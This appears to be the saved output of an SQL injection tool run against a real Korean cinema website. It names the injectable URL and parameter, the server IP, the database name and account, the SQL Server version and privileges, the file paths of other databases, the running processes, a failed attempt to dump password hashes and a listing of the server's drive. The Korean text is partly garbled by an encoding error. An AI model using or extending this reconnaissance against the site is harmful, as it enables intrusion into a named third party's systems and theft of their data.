@@ -1,0 +1,138 @@
+■漏洞信息:============================================================
+ ·URL:http://www.joycine.com/service/sisa/view.asp?id=1683
+ ·页面标题：:::::榴疤绊 蜡蔫茄 康拳技惑 JOYCINE.COM :::::::::::::::::::::::::::::::::::::::::::
+ ·参数:id=1683
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.233.38.34
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:23:06 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 35624
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQSSRQDSD=JHGPANIALDFFKICMAAGNLDHO; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：joycine
+- 用户名：joycine
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：211-233-38-34
+- 服务名：MSSQLSERVER
+- 系统用户名：joycine
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+bearseoul	E:\Program Files\Microsoft SQL Server\MSSQL\data\bearseoul_Data.MDF	
+cinema	E:\Program Files\Microsoft SQL Server\MSSQL\data\cinema_Data.MDF	
+j_cinemaker	E:\Program Files\Microsoft SQL Server\MSSQL\data\j_cinemaker_Data.MDF	
+jmentor_jbnu	E:\Program Files\Microsoft SQL Server\MSSQL\Data\jmentor_jbnu_data.MDF	
+jmentor_jbnu1	E:\Program Files\Microsoft SQL Server\MSSQL\data\jmentor_jbnu1_Data.MDF	
+jmentor_kunsan	E:\Program Files\Microsoft SQL Server\MSSQL\data\jmentor_kunsan_Data.MDF	
+jmentor_sejong	E:\Program Files\Microsoft SQL Server\MSSQL\data\jmentor_sejong_Data.MDF	
+jmentor_woosuk	E:\Program Files\Microsoft SQL Server\MSSQL\data\jmentor_woosuk_Data.MDF	
+joycine	E:\Program Files\Microsoft SQL Server\MSSQL\data\joycine_Data.MDF	
+komibear	E:\Program Files\Microsoft SQL Server\MSSQL\data\komibear_Data.MDF	
+master	E:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+mcinema	E:\Program Files\Microsoft SQL Server\MSSQL\data\mcinema_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	211-233-38-34	2108	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	211-233-38-34	2108	AWAITING COMMAND	SYSTEM	
+SQL 孽府 盒籍扁 - 俺眉 宏扼快历	sleeping	211-233-38-34	3668	AWAITING COMMAND	Administrator	
+SQL 孽府 盒籍扁	sleeping	211-233-38-34	3668	AWAITING COMMAND	Administrator	
+Internet Information Services	sleeping	211-233-38-34	936	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+211-233-38-34	SQL Server	SQLOLEDB	211-233-38-34		211-233-38-34	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of E:: 
+一次性获取失败，正在批次获取……
+
+力厚\
+champaign.co.kr\
+duksung.joycine.com\
+foxkorea.co.kr\
+jmentor.co.kr\
+joycine\
+Program Files\
+RECYCLER\
+System Volume Information\
+teddybear.co.kr\
+固飘3_ 览葛磊.xls
+cdonts.dll
+duksung.zip
+eula.1028.txt
+eula.1031.txt
+eula.1033.txt
+eula.1036.txt
+eula.1040.txt
+eula.1041.txt
+eula.1042.txt
+eula.2052.txt
+eula.3082.txt
+event_comment.sql
+globdata.ini
+IceSword120_en.zip
+images.zip
+INIpay41.dll
+install.exe
+install.ini
+install.res.1028.dll
+install.res.1031.dll
+install.res.1033.dll
+install.res.1036.dll
+install.res.1040.dll
+install.res.1041.dll
+install.res.1042.dll
+install.res.2052.dll
+install.res.3082.dll
+license.dat
+RootCA_ChainCA_Standard.zip寇_3俺.zip
+test.log
+VC_RED.cab
+VC_RED.MSI
+vcredist.bmp
+windows-2003-server-sp2-x86-kor.ulz
+WindowsServer2003-KB975713-x86-KOR.exe
+
